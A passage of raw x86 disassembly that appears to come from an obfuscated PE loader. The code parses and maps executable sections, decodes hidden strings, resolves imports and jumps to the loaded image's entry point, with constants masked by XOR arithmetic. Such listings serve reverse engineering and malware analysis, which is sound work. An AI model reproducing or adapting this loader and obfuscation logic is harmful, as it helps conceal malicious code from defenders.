  4260f2:	mov    eax,DWORD PTR [ebp+0x8]
  4260f5:	add    eax,DWORD PTR [ecx+0x3c]
  4260f8:	mov    DWORD PTR [ebp+0xc],eax
  4260fb:	mov    eax,DWORD PTR [eax+0x50]
  4260fe:	test   eax,eax
  426100:	je     0x426534
  426106:	mov    DWORD PTR [ebp-0x2c],0xf88c85a5
  42610d:	mov    eax,DWORD PTR [ebp-0x2c]
  426110:	xor    eax,esi
  426112:	add    eax,edi
  426114:	mov    DWORD PTR [ebp-0x2c],eax
  426117:	mov    eax,DWORD PTR [ebp-0x4]
  42611a:	mov    eax,DWORD PTR [ebx+0x190]
  426120:	mov    ecx,DWORD PTR [eax]
  426122:	mov    ecx,DWORD PTR [ecx+0x3c]
  426125:	add    ecx,DWORD PTR [eax]
  426127:	mov    eax,DWORD PTR [ebp-0x4]
  42612a:	mov    eax,DWORD PTR [ebx+0x18c]
  426130:	mov    edx,DWORD PTR [eax]
  426132:	mov    DWORD PTR [ebp-0x20],ecx
  426135:	mov    DWORD PTR [ebp+0x20],edx
  426138:	cmp    edx,edx
  42613a:	jne    0x42616e
  42613c:	mov    eax,DWORD PTR [ebx+0x1e0]
  426142:	lea    edx,[ebp-0x18]
  426145:	push   edx
  426146:	mov    edx,DWORD PTR [ebp-0xc]
  426149:	xor    edx,esi
  42614b:	add    edx,edi
  42614d:	push   edx
  42614e:	push   DWORD PTR [ecx+0x50]
  426151:	push   DWORD PTR [ebp+0x20]
  426154:	call   DWORD PTR [eax+0x1c]
  426157:	mov    eax,DWORD PTR [ebp-0x20]
  42615a:	mov    ecx,DWORD PTR [eax+0x54]
  42615d:	mov    eax,DWORD PTR [eax+0x50]
  426160:	sub    eax,ecx
  426162:	add    ecx,DWORD PTR [ebp+0x20]
  426165:	push   ecx
  426166:	call   0x426ad1
  42616b:	mov    edx,DWORD PTR [ebp+0x20]
  42616e:	mov    eax,DWORD PTR [ebx+0x194]
  426174:	mov    DWORD PTR [eax],edx
  426176:	mov    eax,DWORD PTR [ebp+0xc]
  426179:	push   DWORD PTR [eax+0x54]
  42617c:	push   DWORD PTR [ebp+0x8]
  42617f:	push   edx
  426180:	call   0x4269c7
  426185:	mov    ecx,DWORD PTR [ebp+0x20]
  426188:	mov    eax,DWORD PTR [ecx+0x3c]
  42618b:	add    eax,ecx
  42618d:	movzx  ecx,WORD PTR [eax+0x14]
  426191:	lea    ecx,[ecx+eax*1+0x18]
  426195:	mov    DWORD PTR [ebp+0x18],ecx
  426198:	mov    ecx,DWORD PTR [ebp-0x4]
  42619b:	movzx  edx,WORD PTR [eax+0x6]
  42619f:	xor    ecx,esi
  4261a1:	add    ecx,edi
  4261a3:	mov    DWORD PTR [ebp+0xc],eax
  4261a6:	cmp    edx,ecx
  4261a8:	je     0x426255
  4261ae:	mov    ecx,DWORD PTR [ebp-0x4]
  4261b1:	xor    ecx,esi
  4261b3:	add    ecx,edi
  4261b5:	mov    DWORD PTR [ebp-0x8],ecx
  4261b8:	mov    ecx,DWORD PTR [ebp-0x24]
  4261bb:	movzx  edx,WORD PTR [eax+0x6]
  4261bf:	xor    ecx,esi
  4261c1:	sub    edx,ecx
  4261c3:	sub    edx,edi
  4261c5:	cmp    DWORD PTR [ebp-0x8],edx
  4261c8:	ja     0x426255
  4261ce:	mov    edx,DWORD PTR [ebp+0x18]
  4261d1:	add    edx,0x8
  4261d4:	mov    DWORD PTR [ebp+0x18],edx
  4261d7:	jmp    0x4261dc
  4261d9:	mov    edx,DWORD PTR [ebp+0x18]
  4261dc:	mov    eax,DWORD PTR [eax+0x38]
  4261df:	lea    ecx,[eax-0x1]
  4261e2:	mov    DWORD PTR [ebp-0x38],eax
  4261e5:	mov    eax,DWORD PTR [edx]
  4261e7:	test   eax,ecx
  4261e9:	je     0x4261f2
  4261eb:	not    ecx
  4261ed:	and    eax,ecx
  4261ef:	add    eax,DWORD PTR [ebp-0x38]
  4261f2:	mov    ecx,DWORD PTR [edx+0x4]
  4261f5:	add    ecx,DWORD PTR [ebp+0x20]
  4261f8:	push   ecx
  4261f9:	call   0x426ad1
  4261fe:	mov    edx,DWORD PTR [ebp-0x4]
  426201:	mov    eax,DWORD PTR [ebp+0x18]
  426204:	mov    ecx,DWORD PTR [eax+0x8]
  426207:	xor    edx,esi
  426209:	add    edx,edi
  42620b:	cmp    ecx,edx
  42620d:	je     0x426226
  42620f:	push   ecx
  426210:	mov    ecx,DWORD PTR [ebp+0x8]
  426213:	add    ecx,DWORD PTR [eax+0xc]
  426216:	mov    eax,DWORD PTR [eax+0x4]
  426219:	add    eax,DWORD PTR [ebp+0x20]
  42621c:	push   ecx
  42621d:	push   eax
  42621e:	call   0x4269c7
  426223:	mov    eax,DWORD PTR [ebp+0x18]
  426226:	mov    ecx,DWORD PTR [ebp-0x24]
  426229:	mov    edx,DWORD PTR [ebp-0x8]
  42622c:	add    eax,0x28
  42622f:	xor    ecx,esi
  426231:	lea    ecx,[edx+ecx*1+0x3272f6]
  426238:	mov    edx,DWORD PTR [ebp+0xc]
  42623b:	mov    DWORD PTR [ebp+0x18],eax
  42623e:	mov    eax,DWORD PTR [ebp-0x24]
  426241:	movzx  edx,WORD PTR [edx+0x6]
  426245:	xor    eax,esi
  426247:	sub    edx,eax
  426249:	mov    eax,DWORD PTR [ebp+0xc]
  42624c:	sub    edx,edi
  42624e:	mov    DWORD PTR [ebp-0x8],ecx
  426251:	cmp    ecx,edx
  426253:	jbe    0x4261d9
  426255:	mov    edx,DWORD PTR [ebx+0x18c]
  42625b:	mov    ecx,DWORD PTR [ebp+0x20]
  42625e:	cmp    ecx,DWORD PTR [edx]
  426260:	jne    0x426289
  426262:	mov    eax,DWORD PTR [ebx+0x1e0]
  426268:	lea    edx,[ebp-0x18]
  42626b:	push   edx
  42626c:	mov    edx,DWORD PTR [ebp-0x10]
  42626f:	xor    edx,esi
  426271:	add    edx,edi
  426273:	push   edx
  426274:	mov    edx,DWORD PTR [ebp-0x20]
  426277:	push   DWORD PTR [edx+0x54]
  42627a:	push   ecx
  42627b:	call   DWORD PTR [eax+0x1c]
  42627e:	test   eax,eax
  426280:	je     0x426525
  426286:	mov    eax,DWORD PTR [ebp+0xc]
  426289:	mov    ecx,DWORD PTR [ebx+0x1c8]
  42628f:	mov    ecx,DWORD PTR [ecx]
  426291:	xor    ecx,esi
  426293:	add    ecx,edi
  426295:	je     0x426450
  42629b:	mov    eax,DWORD PTR [ebp-0x4]
  42629e:	xor    eax,esi
  4262a0:	add    eax,edi
  4262a2:	and    DWORD PTR [ebp+0x8],0x0
  4262a6:	mov    DWORD PTR [ebp-0x14],eax
  4262a9:	mov    eax,0xf89c85c1
  4262ae:	lea    ecx,[eax+0x18]
  4262b1:	mov    DWORD PTR [ebp-0x58],0xf89c85d7
  4262b8:	mov    DWORD PTR [ebp-0x54],0xf89c85d1
  4262bf:	mov    DWORD PTR [ebp-0x50],eax
  4262c2:	mov    DWORD PTR [ebp-0x4c],ecx
  4262c5:	mov    DWORD PTR [ebp-0x48],ecx
  4262c8:	mov    DWORD PTR [ebp-0x44],0xf89c85a5
  4262cf:	mov    edx,DWORD PTR [ebp+0x8]
  4262d2:	mov    ecx,0x8af
  4262d7:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  4262dc:	mov    edx,0x72f6
  4262e1:	add    cx,dx
  4262e4:	mov    edx,DWORD PTR [ebp+0x8]
  4262e7:	inc    DWORD PTR [ebp+0x8]
  4262ea:	cmp    DWORD PTR [ebp+0x8],0x6
  4262ee:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  4262f6:	jb     0x4262cf
  4262f8:	mov    ecx,0xf89c85d3
  4262fd:	mov    DWORD PTR [ebp-0xb0],eax
  426303:	mov    DWORD PTR [ebp-0x9c],eax
  426309:	mov    DWORD PTR [ebp-0x74],eax
  42630c:	mov    DWORD PTR [ebp-0x70],eax
  42630f:	lea    eax,[ecx-0x1]
  426312:	lea    edx,[ecx+0x2c]
  426315:	mov    DWORD PTR [ebp-0x64],eax
  426318:	mov    DWORD PTR [ebp-0x60],eax
  42631b:	mov    DWORD PTR [ebp-0xb4],0xf89c85f9
  426325:	mov    DWORD PTR [ebp-0xac],ecx
  42632b:	mov    DWORD PTR [ebp-0xa8],edx
  426331:	mov    DWORD PTR [ebp-0xa4],0xf89c85dc
  42633b:	mov    DWORD PTR [ebp-0xa0],0xf89c85d7
  426345:	mov    DWORD PTR [ebp-0x98],0xf89c85e0
  42634f:	mov    DWORD PTR [ebp-0x94],0xf89c85d7
  426359:	mov    DWORD PTR [ebp-0x90],0xf89c85d1
  426363:	mov    DWORD PTR [ebp-0x8c],ecx
  426369:	mov    DWORD PTR [ebp-0x88],0xf89c852c
  426373:	mov    DWORD PTR [ebp-0x84],edx
  426379:	mov    DWORD PTR [ebp-0x80],0xf89c85d6
  426380:	mov    DWORD PTR [ebp-0x7c],ecx
  426383:	mov    DWORD PTR [ebp-0x78],0xf89c85e4
  42638a:	mov    DWORD PTR [ebp-0x6c],ecx
  42638d:	mov    DWORD PTR [ebp-0x68],0xf89c85c0
  426394:	mov    DWORD PTR [ebp-0x5c],0xf89c85a5
  42639b:	xor    eax,eax
  42639d:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  4263a4:	xor    cl,0xaf
  4263a7:	sub    cl,0xa
  4263aa:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  4263b1:	inc    eax
  4263b2:	cmp    eax,0x17
  4263b5:	jb     0x42639d
  4263b7:	mov    eax,DWORD PTR [ebx+0x1e0]
  4263bd:	lea    ecx,[ebp-0xc0]
  4263c3:	push   ecx
  4263c4:	call   DWORD PTR [eax+0x4]
  4263c7:	mov    ecx,DWORD PTR [ebx+0x1e0]
  4263cd:	lea    edx,[ebp-0xd8]
  4263d3:	push   edx
  4263d4:	push   eax
  4263d5:	call   DWORD PTR [ecx+0x8]
  4263d8:	mov    DWORD PTR [ebp-0x40],eax
  4263db:	lea    eax,[ebp-0x14]
  4263de:	push   eax
  4263df:	mov    eax,DWORD PTR [ebx+0x18c]
  4263e5:	push   DWORD PTR [eax]
  4263e7:	mov    eax,DWORD PTR [ebp-0x40]
  4263ea:	call   eax
  4263ec:	mov    eax,DWORD PTR [ebp-0x4]
  4263ef:	xor    eax,esi
  4263f1:	add    eax,edi
  4263f3:	mov    DWORD PTR [ebp-0x34],eax
  4263f6:	mov    ecx,DWORD PTR [ebp-0x4]
  4263f9:	mov    eax,DWORD PTR [ebp-0x14]
  4263fc:	xor    ecx,esi
  4263fe:	add    ecx,edi
  426400:	cmp    eax,ecx
  426402:	je     0x42644d
  426404:	mov    DWORD PTR [ebp-0x3c],eax
  426407:	jmp    0x426418
  426409:	mov    eax,DWORD PTR [eax]
  42640b:	mov    ecx,DWORD PTR [ebp-0x3c]
  42640e:	mov    DWORD PTR [ebp-0x14],eax
  426411:	mov    eax,DWORD PTR [ebp-0x14]
  426414:	cmp    eax,ecx
  426416:	je     0x426425
  426418:	mov    edx,DWORD PTR [eax+0x18]
  42641b:	mov    ecx,DWORD PTR [ebx+0x18c]
  426421:	cmp    edx,DWORD PTR [ecx]
  426423:	jne    0x426409
  426425:	mov    ecx,DWORD PTR [ebx+0x18c]
  42642b:	mov    edx,DWORD PTR [eax+0x18]
  42642e:	cmp    edx,DWORD PTR [ecx]
  426430:	jne    0x42644d
  426432:	mov    ecx,DWORD PTR [ebx+0x190]
  426438:	mov    edx,DWORD PTR [ebp-0x20]
  42643b:	mov    edx,DWORD PTR [edx+0x28]
  42643e:	add    edx,DWORD PTR [ecx]
  426440:	mov    DWORD PTR [eax+0x1c],edx
  426443:	mov    eax,DWORD PTR [ebp-0x24]
  426446:	xor    eax,esi
  426448:	add    eax,edi
  42644a:	mov    DWORD PTR [ebp-0x34],eax
  42644d:	mov    eax,DWORD PTR [ebp+0xc]
  426450:	push   ebx
  426451:	push   eax
  426452:	push   DWORD PTR [ebp+0x20]
  426455:	call   0x425bd5
  42645a:	test   eax,eax
  42645c:	je     0x426525
  426462:	push   DWORD PTR [ebp+0xc]
  426465:	mov    ecx,ebx
  426467:	push   DWORD PTR [ebp+0x20]
  42646a:	call   0x425b2e
  42646f:	test   eax,eax
  426471:	je     0x426525
  426477:	mov    eax,DWORD PTR [ebp+0xc]
  42647a:	mov    edx,DWORD PTR [ebp+0x20]
  42647d:	mov    ecx,ebx
  42647f:	call   0x425a07
  426484:	test   eax,eax
  426486:	je     0x426525
  42648c:	push   ebx
  42648d:	push   DWORD PTR [ebp+0x20]
  426490:	call   0x425eb8
  426495:	test   eax,eax
  426497:	je     0x426525
  42649d:	mov    eax,DWORD PTR [ebx+0x18c]
  4264a3:	mov    edx,DWORD PTR [ebp+0x20]
  4264a6:	cmp    edx,DWORD PTR [eax]
  4264a8:	jne    0x4264c4
  4264aa:	mov    eax,DWORD PTR [ebx+0x1e0]
  4264b0:	lea    ecx,[ebp-0x18]
  4264b3:	push   ecx
  4264b4:	push   DWORD PTR [ebp-0x18]
  4264b7:	mov    ecx,DWORD PTR [ebp-0x20]
  4264ba:	push   DWORD PTR [ecx+0x54]
  4264bd:	push   edx
  4264be:	call   DWORD PTR [eax+0x1c]
  4264c1:	mov    edx,DWORD PTR [ebp+0x20]
  4264c4:	mov    eax,DWORD PTR [ebx+0x1c8]
  4264ca:	mov    eax,DWORD PTR [eax]
  4264cc:	xor    eax,esi
  4264ce:	add    eax,edi
  4264d0:	je     0x426509
  4264d2:	mov    ecx,DWORD PTR [ebp+0xc]
  4264d5:	mov    eax,DWORD PTR [ecx+0x28]
  4264d8:	mov    DWORD PTR [ebp+0x8],0xf89ca5a5
  4264df:	mov    esi,DWORD PTR [ebp+0x8]
  4264e2:	push   DWORD PTR [ebp+0x14]
  4264e5:	xor    esi,0x8af
  4264eb:	push   DWORD PTR [ebp+0x10]
  4264ee:	add    esi,0x72f6
  4264f4:	or     WORD PTR [ecx+0x16],si
  4264f8:	add    eax,edx
  4264fa:	push   edx
  4264fb:	call   eax
  4264fd:	mov    DWORD PTR [ebx+0x1d0],0xf89c85a4
  426507:	jmp    0x426513
  426509:	mov    eax,DWORD PTR [ebp+0xc]
  42650c:	mov    eax,DWORD PTR [eax+0x28]
  42650f:	add    eax,edx
  426511:	call   eax
  426513:	mov    DWORD PTR [ebp-0x8],eax
  426516:	mov    eax,DWORD PTR [ebp-0x8]
  426519:	mov    ecx,DWORD PTR [ebp+0x1c]
  42651c:	mov    DWORD PTR [ecx],eax
  42651e:	mov    DWORD PTR [ebp-0x30],0x1
  426525:	cmp    DWORD PTR [ebp-0x30],0x0
  426529:	jne    0x42652f
  42652b:	and    DWORD PTR [ebp+0x20],0x0
  42652f:	mov    eax,DWORD PTR [ebp+0x20]
  426532:	jmp    0x426536
  426534:	xor    eax,eax
  426536:	pop    edi
  426537:	pop    esi
  426538:	pop    ebx
  426539:	leave  
  42653a:	ret    0x1c
  42653d:	push   ebp
  42653e:	mov    ebp,esp
  426540:	movzx  edx,WORD PTR [ecx+0x6]
  426544:	movzx  eax,WORD PTR [ecx+0x14]
  426548:	push   ebx
  426549:	push   edi
  42654a:	xor    edi,edi
  42654c:	lea    eax,[eax+ecx*1+0x18]
  426550:	test   edx,edx
  426552:	je     0x426573
  426554:	mov    ecx,DWORD PTR [eax+0xc]
  426557:	lea    ebx,[ecx+esi*1]
  42655a:	cmp    DWORD PTR [ebp+0x8],ebx
  42655d:	jb     0x42656b
  42655f:	mov    ebx,DWORD PTR [eax+0x8]
  426562:	add    ebx,ecx
  426564:	add    ebx,esi
  426566:	cmp    DWORD PTR [ebp+0x8],ebx
  426569:	jb     0x426575
  42656b:	add    eax,0x28
  42656e:	inc    edi
  42656f:	cmp    edi,edx
  426571:	jb     0x426554
  426573:	xor    eax,eax
  426575:	pop    edi
  426576:	pop    ebx
  426577:	pop    ebp
  426578:	ret    0x4
  42657b:	push   ebp
  42657c:	mov    ebp,esp
  42657e:	sub    esp,0x34
  426581:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  426588:	mov    DWORD PTR [ebp-0x18],0xf89c85a4
  42658f:	mov    DWORD PTR [ebp-0x1c],0xf89c85a3
  426596:	mov    DWORD PTR [ebp-0x8],0xf89c85c4
  42659d:	mov    DWORD PTR [ebp-0x20],0xf89c85e4
  4265a4:	mov    DWORD PTR [ebp-0x2c],0xf89c852b
  4265ab:	mov    DWORD PTR [ebp-0x2c],0xf89c85cb
  4265b2:	mov    DWORD PTR [ebp-0x10],eax
  4265b5:	mov    eax,DWORD PTR [ebp+0x8]
  4265b8:	mov    DWORD PTR [ebp-0x14],eax
  4265bb:	mov    eax,DWORD PTR [ebp-0xc]
  4265be:	push   ebx
  4265bf:	mov    ecx,0x75108af
  4265c4:	xor    eax,ecx
  4265c6:	push   esi
  4265c7:	mov    esi,DWORD PTR [ebp-0x10]
  4265ca:	mov    edx,0x3272f6
  4265cf:	add    eax,edx
  4265d1:	push   edi
  4265d2:	cmp    esi,eax
  4265d4:	je     0x4267b3
  4265da:	mov    eax,DWORD PTR [ebp-0xc]
  4265dd:	mov    esi,DWORD PTR [ebp-0x14]
  4265e0:	xor    eax,ecx
  4265e2:	add    eax,edx
  4265e4:	cmp    esi,eax
  4265e6:	je     0x4267b3
  4265ec:	mov    eax,DWORD PTR [ebp-0xc]
  4265ef:	xor    eax,ecx
  4265f1:	add    eax,edx
  4265f3:	mov    DWORD PTR [ebp-0x24],eax
  4265f6:	mov    eax,DWORD PTR [ebp-0xc]
  4265f9:	xor    eax,ecx
  4265fb:	add    eax,edx
  4265fd:	mov    DWORD PTR [ebp-0x28],eax
  426600:	mov    edi,DWORD PTR [ebp-0x20]
  426603:	mov    ebx,DWORD PTR [ebp-0x8]
  426606:	mov    esi,0x8af
  42660b:	xor    edi,esi
  42660d:	mov    eax,0x72f6
  426612:	xor    ebx,esi
  426614:	add    edi,eax
  426616:	add    ebx,eax
  426618:	sub    ebx,edi
  42661a:	mov    WORD PTR [ebp-0x8],bx
  42661e:	jmp    0x4266e3
  426623:	mov    edi,DWORD PTR [ebp-0xc]
  426626:	mov    bx,WORD PTR [ebp-0x4]
  42662a:	xor    edi,esi
  42662c:	add    edi,eax
  42662e:	cmp    bx,di
  426631:	je     0x426725
  426637:	mov    edi,DWORD PTR [ebp-0xc]
  42663a:	mov    ebx,DWORD PTR [ebp+0xc]
  42663d:	xor    edi,ecx
  42663f:	add    edi,edx
  426641:	cmp    ebx,edi
  426643:	mov    di,WORD PTR [ebp-0x4]
  426647:	mov    bx,WORD PTR [ebp+0x8]
  42664b:	je     0x4266b6
  42664d:	cmp    bx,di
  426650:	je     0x4266bf
  426652:	mov    edi,DWORD PTR [ebp-0x20]
  426655:	mov    bx,WORD PTR [ebp+0x8]
  426659:	xor    edi,esi
  42665b:	add    edi,eax
  42665d:	cmp    bx,di
  426660:	jb     0x426680
  426662:	mov    edi,DWORD PTR [ebp-0x2c]
  426665:	mov    bx,WORD PTR [ebp+0x8]
  426669:	xor    edi,esi
  42666b:	add    edi,eax
  42666d:	cmp    bx,di
  426670:	ja     0x426680
  426672:	movzx  edi,WORD PTR [ebp+0x8]
  426676:	movzx  ebx,WORD PTR [ebp-0x8]
  42667a:	add    edi,ebx
  42667c:	mov    WORD PTR [ebp+0x8],di
  426680:	mov    edi,DWORD PTR [ebp-0x20]
  426683:	mov    bx,WORD PTR [ebp-0x4]
  426687:	xor    edi,esi
  426689:	add    edi,eax
  42668b:	cmp    bx,di
  42668e:	jb     0x4266ae
  426690:	mov    edi,DWORD PTR [ebp-0x2c]
  426693:	mov    bx,WORD PTR [ebp-0x4]
  426697:	xor    edi,esi
  426699:	add    edi,eax
  42669b:	cmp    bx,di
  42669e:	ja     0x4266ae
  4266a0:	movzx  edi,WORD PTR [ebp-0x4]
  4266a4:	movzx  ebx,WORD PTR [ebp-0x8]
  4266a8:	add    edi,ebx
  4266aa:	mov    WORD PTR [ebp-0x4],di
  4266ae:	mov    di,WORD PTR [ebp-0x4]
  4266b2:	mov    bx,WORD PTR [ebp+0x8]
  4266b6:	cmp    bx,di
  4266b9:	jne    0x4267b3
  4266bf:	mov    edi,DWORD PTR [ebp-0x1c]
  4266c2:	mov    ebx,DWORD PTR [ebp-0x10]
  4266c5:	xor    edi,ecx
  4266c7:	lea    edi,[edi+ebx*1+0x3272f6]
  4266ce:	mov    DWORD PTR [ebp-0x10],edi
  4266d1:	mov    edi,DWORD PTR [ebp-0x1c]
  4266d4:	mov    ebx,DWORD PTR [ebp-0x14]
  4266d7:	xor    edi,ecx
  4266d9:	lea    edi,[edi+ebx*1+0x3272f6]
  4266e0:	mov    DWORD PTR [ebp-0x14],edi
  4266e3:	mov    edi,DWORD PTR [ebp-0x24]
  4266e6:	mov    ebx,DWORD PTR [ebp-0x10]
  4266e9:	mov    di,WORD PTR [ebx+edi*2]
  4266ed:	mov    WORD PTR [ebp+0x8],di
  4266f1:	mov    edi,DWORD PTR [ebp-0x28]
  4266f4:	mov    ebx,DWORD PTR [ebp-0x14]
  4266f7:	mov    di,WORD PTR [ebx+edi*2]
  4266fb:	mov    WORD PTR [ebp-0x4],di
  4266ff:	mov    edi,DWORD PTR [ebp-0xc]
  426702:	mov    bx,WORD PTR [ebp+0x8]
  426706:	xor    edi,esi
  426708:	add    edi,eax
  42670a:	cmp    bx,di
  42670d:	jne    0x426623
  426713:	mov    eax,DWORD PTR [ebp-0x18]
  426716:	mov    esi,DWORD PTR [ebp-0xc]
  426719:	xor    eax,ecx
  42671b:	add    eax,edx
  42671d:	imul   eax,esi
  426720:	mov    DWORD PTR [ebp-0xc],eax
  426723:	jmp    0x426737
  426725:	mov    eax,DWORD PTR [ebp-0xc]
  426728:	mov    esi,DWORD PTR [ebp-0x18]
  42672b:	xor    eax,ecx
  42672d:	lea    eax,[eax+esi*1+0x3272f6]
  426734:	mov    DWORD PTR [ebp-0x18],eax
  426737:	mov    eax,DWORD PTR [ebp-0x24]
  42673a:	sub    eax,edx
  42673c:	xor    eax,ecx
  42673e:	mov    DWORD PTR [ebp-0x30],eax
  426741:	mov    eax,DWORD PTR [ebp-0x28]
  426744:	sub    eax,edx
  426746:	xor    eax,ecx
  426748:	mov    DWORD PTR [ebp-0x34],eax
  42674b:	mov    eax,DWORD PTR [ebp-0x34]
  42674e:	mov    esi,DWORD PTR [ebp-0x1c]
  426751:	xor    esi,ecx
  426753:	add    esi,edx
  426755:	xor    eax,ecx
  426757:	add    eax,0x3272f6
  42675c:	imul   esi,eax
  42675f:	mov    eax,DWORD PTR [ebp-0x14]
  426762:	movzx  eax,WORD PTR [esi+eax*1]
  426766:	mov    esi,DWORD PTR [ebp-0x30]
  426769:	mov    edi,DWORD PTR [ebp-0x1c]
  42676c:	xor    esi,ecx
  42676e:	add    esi,edx
  426770:	xor    edi,ecx
  426772:	add    edi,edx
  426774:	imul   edi,esi
  426777:	mov    esi,DWORD PTR [ebp-0x10]
  42677a:	movzx  esi,WORD PTR [edi+esi*1]
  42677e:	sub    eax,edx
  426780:	sub    esi,edx
  426782:	xor    eax,ecx
  426784:	xor    esi,ecx
  426786:	cmp    esi,eax
  426788:	jne    0x4267b3
  42678a:	mov    eax,DWORD PTR [ebp-0x30]
  42678d:	mov    esi,DWORD PTR [ebp-0x1c]
  426790:	xor    eax,ecx
  426792:	add    eax,0x3272f6
  426797:	xor    esi,ecx
  426799:	add    esi,edx
  42679b:	imul   esi,eax
  42679e:	mov    eax,DWORD PTR [ebp-0x10]
  4267a1:	movzx  eax,WORD PTR [esi+eax*1]
  4267a5:	mov    esi,DWORD PTR [ebp-0xc]
  4267a8:	sub    eax,edx
  4267aa:	xor    eax,ecx
  4267ac:	cmp    eax,esi
  4267ae:	mov    eax,DWORD PTR [ebp-0xc]
  4267b1:	je     0x4267b6
  4267b3:	mov    eax,DWORD PTR [ebp-0x18]
  4267b6:	pop    edi
  4267b7:	xor    eax,ecx
  4267b9:	pop    esi
  4267ba:	add    eax,edx
  4267bc:	pop    ebx
  4267bd:	leave  
  4267be:	ret    0x8
  4267c1:	push   ebp
  4267c2:	mov    ebp,esp
  4267c4:	push   ecx
  4267c5:	mov    cx,WORD PTR [eax]
  4267c8:	push   esi
  4267c9:	mov    esi,0x3b5d
  4267ce:	sub    cx,si
  4267d1:	mov    esi,0x8a9b
  4267d6:	xor    cx,si
  4267d9:	mov    esi,0x4e38
  4267de:	mov    DWORD PTR [ebp-0x4],0xf89c85a6
  4267e5:	mov    edx,0xf89c85a5
  4267ea:	cmp    cx,si
  4267ed:	je     0x42684c
  4267ef:	push   ebx
  4267f0:	push   edi
  4267f1:	movzx  ecx,cx
  4267f4:	mov    edi,0xffcd8d0a
  4267f9:	mov    esi,0x75108af
  4267fe:	mov    ebx,0x4e64
  426803:	cmp    cx,bx
  426806:	jne    0x42680b
  426808:	mov    DWORD PTR [ebp-0x4],edx
  42680b:	lea    edx,[edi+0x1]
  42680e:	xor    edx,esi
  426810:	mov    edi,edx
  426812:	xor    edi,esi
  426814:	mov    cx,WORD PTR [eax+edi*2+0x64e5ec]
  42681c:	mov    ebx,0x3b5d
  426821:	sub    cx,bx
  426824:	mov    ebx,0x8a9b
  426829:	xor    cx,bx
  42682c:	mov    ebx,0x4e38
  426831:	cmp    cx,bx
  426834:	jne    0x4267fe
  426836:	mov    ecx,DWORD PTR [ebp-0x4]
  426839:	pop    edi
  42683a:	pop    ebx
  42683b:	cmp    ecx,0xf89c85a6
  426841:	je     0x42684c
  426843:	xor    ecx,esi
  426845:	lea    eax,[eax+ecx*2+0x64e5ee]
  42684c:	pop    esi
  42684d:	leave  
  42684e:	ret    
  42684f:	push   ebp
  426850:	mov    ebp,esp
  426852:	push   ecx
  426853:	push   esi
  426854:	push   edi
  426855:	mov    DWORD PTR [ebp-0x4],0xf89c85a6
  42685c:	mov    esi,0xf89c85a5
  426861:	call   0x4267c1
  426866:	mov    edi,eax
  426868:	mov    al,BYTE PTR [edi]
  42686a:	sub    al,0x4
  42686c:	xor    al,0x7f
  42686e:	cmp    al,0x83
  426870:	je     0x4268d3
  426872:	mov    eax,edi
  426874:	mov    edx,0xffcd8d0a
  426879:	mov    ecx,0x75108af
  42687e:	push   ebx
  42687f:	mov    ax,WORD PTR [eax]
  426882:	mov    ebx,0x3b5d
  426887:	sub    ax,bx
  42688a:	mov    ebx,0x8a9b
  42688f:	xor    ax,bx
  426892:	mov    ebx,0x4e4a
  426897:	cmp    ax,bx
  42689a:	jne    0x42689f
  42689c:	mov    DWORD PTR [ebp-0x4],esi
  42689f:	lea    esi,[edx+0x1]
  4268a2:	xor    esi,ecx
  4268a4:	mov    edx,esi
  4268a6:	xor    edx,ecx
  4268a8:	lea    eax,[edi+edx*2+0x64e5ec]
  4268af:	mov    bl,BYTE PTR [eax]
  4268b1:	sub    bl,0x4
  4268b4:	xor    bl,0x7f
  4268b7:	cmp    bl,0x83
  4268ba:	jne    0x42687f
  4268bc:	mov    eax,DWORD PTR [ebp-0x4]
  4268bf:	pop    ebx
  4268c0:	cmp    eax,0xf89c85a6
  4268c5:	je     0x4268d3
  4268c7:	xor    eax,ecx
  4268c9:	xor    ecx,ecx
  4268cb:	mov    WORD PTR [edi+eax*2+0x64e5ec],cx
  4268d3:	mov    eax,edi
  4268d5:	pop    edi
  4268d6:	pop    esi
  4268d7:	leave  
  4268d8:	ret    
  4268d9:	push   ebp
  4268da:	mov    ebp,esp
  4268dc:	push   ecx
  4268dd:	push   esi
  4268de:	mov    DWORD PTR [ebp-0x4],0xf89c85a6
  4268e5:	mov    esi,0xf89c85a5
  4268ea:	call   0x4267c1
  4268ef:	mov    cx,WORD PTR [eax]
  4268f2:	mov    edx,0x3b5d
  4268f7:	sub    cx,dx
  4268fa:	mov    edx,0x8a9b
  4268ff:	xor    cx,dx
  426902:	mov    edx,0x4e38
  426907:	cmp    cx,dx
  42690a:	je     0x426963
  42690c:	push   ebx
  42690d:	push   edi
  42690e:	movzx  ecx,cx
  426911:	mov    edx,0xffcd8d0a
  426916:	mov    edi,0x75108af
  42691b:	mov    ebx,0x4e4a
  426920:	cmp    cx,bx
  426923:	jne    0x426928
  426925:	mov    DWORD PTR [ebp-0x4],esi
  426928:	lea    esi,[edx+0x1]
  42692b:	xor    esi,edi
  42692d:	mov    edx,esi
  42692f:	xor    edx,edi
  426931:	mov    cx,WORD PTR [eax+edx*2+0x64e5ec]
  426939:	mov    ebx,0x3b5d
  42693e:	sub    cx,bx
  426941:	mov    ebx,0x8a9b
  426946:	xor    cx,bx
  426949:	mov    ebx,0x4e38
  42694e:	cmp    cx,bx
  426951:	jne    0x42691b
  426953:	cmp    DWORD PTR [ebp-0x4],0xf89c85a6
  42695a:	pop    edi
  42695b:	pop    ebx
  42695c:	je     0x426963
  42695e:	xor    eax,eax
  426960:	inc    eax
  426961:	jmp    0x426965
  426963:	xor    eax,eax
  426965:	pop    esi
  426966:	leave  
  426967:	ret    
  426968:	push   ebp
  426969:	mov    ebp,esp
  42696b:	push   ecx
  42696c:	mov    eax,DWORD PTR [ebp+0x8]
  42696f:	movzx  ecx,WORD PTR [eax]
  426972:	push   esi
  426973:	lea    eax,[ecx-0x3b5d]
  426979:	mov    esi,0x8a9b
  42697e:	push   edi
  42697f:	xor    eax,esi
  426981:	mov    edi,0x4e38
  426986:	mov    DWORD PTR [ebp-0x4],edx
  426989:	cmp    ax,di
  42698c:	je     0x4269b9
  42698e:	mov    eax,DWORD PTR [ebp+0x8]
  426991:	sub    eax,edx
  426993:	mov    DWORD PTR [ebp+0x8],eax
  426996:	jmp    0x42699b
  426998:	mov    eax,DWORD PTR [ebp+0x8]
  42699b:	mov    WORD PTR [edx],cx
  42699e:	add    edx,0x2
  4269a1:	movzx  edi,WORD PTR [eax+edx*1]
